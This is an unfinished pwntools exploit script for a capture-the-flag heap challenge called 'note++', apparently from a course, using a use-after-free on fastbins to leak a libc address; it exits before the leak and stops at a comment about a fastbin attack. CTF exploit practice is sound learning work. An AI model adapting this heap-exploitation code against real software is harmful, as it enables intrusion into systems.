# python 2.7 for better compatibility
from pwn import *

context.clear(arch='x86_64')

# chunk malloc hook
# r = remote('edu-ctf.csie.org', 10178)
r = process('./note++')
libc = ELF('./libc.so', checksec=False)


note_cnt = 0
def add(size, note, description):
    r.sendafter('>', '1')
    r.sendafter('Size: ', str(size))
    r.sendafter('Note: ', note)
    r.sendafter('note: ', description)

    global note_cnt
    note_cnt += 1
    return note_cnt - 1

def show():
    r.sendafter('>', '2')
    recv_list = r.recvuntil('\x90').split('\n')
    print(recv_list)

def delete(idx):
    r.sendafter('>', '3')
    r.sendafter('Index: ', str(idx))


# UAF: create 2 fastbin for leaking heap address
a = add(0x0, '\x61' * 0x5, '\x87' * 47 + '\x88' * 1) # note 0
b = add(0x0, '\x61' * 0x5, '\x89' * 47 + '\x90' * 1) # note 1
pause()
delete(a)
delete(b)
pause()
a = add(0x0, '\x61' * 0x5, '\x91' * 47 + '\x92' * 1) # note 0
b = add(0x0, '\x61' * 0x5, '\x93' * 47 + '\x94' * 1) # note 1
show()
exit()

libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
print('libc_base --> ', hex(libc_base))
# create fastbin attack, for fake chunk
